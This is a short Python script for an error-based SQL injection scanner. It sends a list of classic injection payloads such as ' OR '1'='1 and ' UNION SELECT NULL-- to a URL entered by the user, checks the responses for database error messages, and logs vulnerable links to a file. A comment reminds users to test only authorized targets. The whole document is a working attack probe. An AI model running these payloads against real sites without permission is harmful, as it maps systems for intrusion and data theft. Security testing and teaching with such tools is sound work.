import requests
from concurrent.futures import ThreadPoolExecutor
import time

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' AND 1=2--"
]

sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

def is_vulnerable(response_text):
    for error in sql_errors:
        if error.lower() in response_text.lower():
            return True
    return False

def test_url(url):
    print(f"[+] Testing {url}")
    vulnerable = False

    for payload in payloads:
        try:
            if "?" in url:
                test_link = f"{url}{payload}"
            else:
                test_link = f"{url}?id={payload}"

            r = requests.get(test_link, timeout=5)

            if is_vulnerable(r.text):
                print(f"[!!] SQL Injection vulnerability found:")
                print(f"     {test_link}")
                with open("results.txt", "a") as f:
                    f.write(f"VULNERABLE: {test_link}\n")
                vulnerable = True
                break

            time.sleep(1)  # rate limiting

        except Exception as e:
            print(f"[x] Error testing {url}: {e}")

    if not vulnerable:
        print(f"[-] Not vulnerable: {url}")

if __name__ == "__main__":
    print("=== SQL Injection Scanner ===")

    target = input("Enter target URL (only legal test sites): ").strip()

    print("\n⚠️  Reminder: Test only on authorized / practice targets\n")

    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(test_url, [target])

    print("\n=== Scan Completed ===")
